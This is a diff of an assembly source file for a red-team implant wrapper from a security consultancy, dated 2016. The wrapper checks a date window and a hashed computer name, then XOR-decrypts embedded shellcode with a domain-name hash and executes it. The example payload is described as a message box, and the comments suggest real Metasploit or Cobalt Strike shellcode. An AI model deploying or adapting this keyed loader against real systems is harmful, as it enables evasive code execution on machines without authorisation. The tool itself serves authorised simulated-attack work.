@@ -4,17 +4,20 @@
 ;  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
 ;  MWR InfoSecurity Ltd, MWR Labs
 ;
-;  This code is designed to act as a basis for safer implants during simulated
+;  This code is designed to act as a wrapper for existing implants during simulated
 ;  attacks. 
 ;
 ;  Compile this by running 'makeit.bat' from the same drive as a masm32 installation.
 ;
 ;  In its current form, it:
-;  1. Hashes the NetBIOS name of the computer it is being run on and compares this
-;     to a stored hash. It exits if they do not match.
-;  2. Hashes the DNS domain name of the computer it is being run on and xors the
-;     hash (concatenated with itself if necessary) against the included shellcode
-;  3. Executes the (xor'd) shellcode.
+; 
+;    1. Checks to ensure that the current time is acceptable (i.e. within the agreed
+;       timescales of the simulated attack)
+;    2. Hashes the NetBIOS name of the computer it is being run on and compares this
+;       to a stored hash. It exits if they do not match.
+;    3. Hashes the DNS domain name of the computer it is being run on and xors the
+;       hash (concatenated with itself if necessary) against the included shellcode
+;    4. Executes the (xor'd) shellcode.
 ; 
 ; -----------------------------------------------------------------------------
 
@@ -27,11 +30,9 @@ option casemap:none
 ; -----------------------------------------------------------------------------
 
 include \masm32\include\windows.inc
-include \masm32\include\user32.inc
 include \masm32\include\kernel32.inc
 include \masm32\include\advapi32.inc
 includelib \masm32\lib\kernel32.lib
-includelib \masm32\lib\user32.lib           
 includelib \masm32\lib\advapi32.lib           
 
 ; -----------------------------------------------------------------------------
@@ -39,15 +40,16 @@ includelib \masm32\lib\advapi32.lib
 ;  in advance so that the lexcial analyser will work properly
 ; -----------------------------------------------------------------------------
 
-CheckExecution PROTO 
-MutexCheck PROTO
+CheckExecution   PROTO 
+MutexCheck       PROTO
 ExecuteShellcode PROTO
-GetComputerInfo PROTO :DWORD
-GenerateHash PROTO :DWORD,:DWORD
+GetComputerInfo  PROTO :DWORD
+GenerateHash     PROTO :DWORD,:DWORD
+SafeStrLen       PROTO :DWORD
 
 .data         
                      
-; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
+; I had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
 ; and some experimentation. You shouldn't need to change this.
 CNF_ComputerNamePhysicalNetBIOS           equ 4
 CNF_ComputerNamePhysicalDnsHostname       equ 5
@@ -55,7 +57,7 @@ CNF_ComputerNamePhysicalDnsDomain         equ 6
 CNF_ComputerNamePhysicalDnsFullyQualified equ 7
 
 ; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
-; It identifies the constant needed to request a SHA1 hash from the Crypto API
+; It identifies the constant needed to request a SHA1 hash from the Crypto API.
 MS_CALG_SHA1 equ 8004h    
 MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
@@ -63,11 +65,13 @@ MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 
 strMutexName  db  "Local\Stufus",0    
 
 ; The hash of the authorised NetBIOS computer name. Change this to the real hash.
-; You can generate this with raw2src.py or manually if you prefer
+; You can generate this with raw2src.py. e.g. ./raw2src.py -c STUFUS -o MASM
+; This is actually the SHA1 hash of the word 'STUFUS'
 hashSHA1ComputerName db 83,143,104,249,44,163,118,229,35,230,214,169,104,99,222,2,125,118,163,218
 
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
-; You can generate this with raw2src.py or manually if you prefer
+; You can generate this with raw2src.py. e.g. ./raw2src.py -s shellcode.raw -x "MWRINFOSECURITY.COM" -o MASM 
+; This example simply displays a messagebox.
 shellcode db 138,100,243,32,88,135,130,212,241,84,161,152,161,7,85,115,77,253,213,214
           db 216,249,116,114,106,171,253,155,3,109,224,145,39,123,171,241,36,119,114,37
           db 178,239,227,149,8,135,253,160,31,109,130,129,16,98,52,137,55,110,40,128
@@ -96,7 +100,7 @@ stufus:
 ; -----------------------------------------------------------------------------
  
 invoke CheckExecution       ; This does the main work
-invoke ExitProcess, NULL    ; Exit cleanly when the time comes
+invoke ExitProcess, NULL    ; Exit cleanly
 
 
 
@@ -109,17 +113,27 @@ invoke ExitProcess, NULL    ; Exit cleanly when the time comes
 ; -----------------------------------------------------------------------------
 
 CheckExecution PROC uses esi edi
+LOCAL currenttime:SYSTEMTIME
 
  ; ============================================================================
- ; 
- ; CHECK 1: NETBIOS NAME vs STORED HASH
- ;
+ ; CHECK 1: Check the current date/time
+ ; ============================================================================
+
+ invoke GetSystemTime, addr currenttime  ; Retrieve the system time (in UTC)
+ .if currenttime.wYear != 2016           ; In this example, ensure that the executable
+    jmp done                             ; does not run after the end of July 2016.
+ .elseif currenttime.wMonth > 7
+    jmp done
+ .endif
+
+ ; ============================================================================
+ ; CHECK 2: NETBIOS NAME vs STORED HASH
  ; ============================================================================
 
  ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
  invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
  mov esi, eax           ; Contains the raw computer name
- invoke lstrlen, esi    
+ invoke SafeStrLen, esi    
  mov ecx, eax           ; Contains the length of the raw computer name
  invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the computer name
  mov edi, eax           ; Contains the hash of the raw computer name
@@ -133,12 +147,8 @@ CheckExecution PROC uses esi edi
  repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
  jnz badhash                    ; If they are different, the hash was incorrect
 
-
-
  ; ============================================================================
- ; 
- ; CHECK 2: MUTEX
- ;
+ ; CHECK 3: MUTEX
  ; ============================================================================
 
  ; Check to see whether the implant is already running or not
@@ -146,18 +156,14 @@ CheckExecution PROC uses esi edi
  test eax, eax       ; If return value is 0, don't continue
  jz done
 
-
-
  ; ============================================================================
- ; 
- ; CHECK 3: XORing shellcode against hash of domain name
- ;
+ ; CHECK 4: XORing shellcode against hash of domain name
  ; ============================================================================
 
  ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
  invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
  mov esi, eax           ; Contains the raw computer name
- invoke lstrlen, esi    
+ invoke SafeStrLen, esi    
  mov ecx, eax           ; Contains the length of the FQDN
  invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the FQDN
  mov edi, eax           ; Contains the hash of the FQDN
@@ -165,16 +171,15 @@ CheckExecution PROC uses esi edi
 
  ; Now loop through the shellcode xoring it with the hash values (repeating hash
  ; values if necessary)
- ; ecx = The loop counter (i.e. position in the shellcode)
- ; edi = Pointer to the hash
- ; eax = The position in the hash
- ; esi = Pointer to the shellcode
- ; edx = 'Working' register (to store the current character)
+ ;   ecx = The loop counter (i.e. position in the shellcode)
+ ;   edi = Pointer to the hash
+ ;   eax = The position in the hash
+ ;   esi = Pointer to the shellcode
+ ;   edx = 'Working' register (to store the current character). Am using dh.
  mov ecx, 0
  mov eax, 0
  mov esi, offset shellcode
  xor edx, edx
-
 startloop:
  mov dh, byte ptr [esi+ecx]
  xor dh, byte ptr [edi+eax]
@@ -188,13 +193,12 @@ startloop:
     inc ecx
     jmp startloop                    ; If not, increase the counter by one and start again
  .endif
+
  invoke GlobalFree, edi              ; Free the hash buffer
 
 
  ; ============================================================================
- ; 
  ; Finally execute the shellcode
- ;
  ; ============================================================================
 
  invoke ExecuteShellcode
@@ -270,7 +274,13 @@ MutexCheck ENDP
 
 
 
-; Generate hash using CryptoAPI
+; -----------------------------------------------------------------------------
+; 
+;  GenerateHash
+;  This function generates a SHA1 hash of the input using the MS Crypto API
+; 
+; -----------------------------------------------------------------------------
+
 GenerateHash PROC uses esi ptrString:DWORD,stringlength:DWORD
 LOCAL hProv:DWORD
 LOCAL hHash:DWORD
@@ -331,4 +341,36 @@ ExecuteShellcode PROC uses esi edi
   .endif
 ExecuteShellcode ENDP
 
+
+
+
+; -----------------------------------------------------------------------------
+; 
+;  SafeStrLen
+;  This function calculates the length of a string (with a maximum).
+;  It is such a simple function that I implemented it here just to save
+;  an API call :)
+;
+;  It counts from the start to chr(0) or >1024 because I can't see a computer
+;  name or domain name legitimately being anywhere near that length.
+; 
+; -----------------------------------------------------------------------------
+SafeStrLen PROC uses esi buf:DWORD
+
+ xor ecx, ecx
+ mov esi, buf
+
+startloop:
+ mov al, byte ptr [esi+ecx]
+ test al, al
+ jz return
+ cmp ecx, 1024
+ jg return
+ inc ecx
+ jmp startloop
+
+return:
+ mov eax, ecx
+ ret
+SafeStrLen ENDP
 End stufus
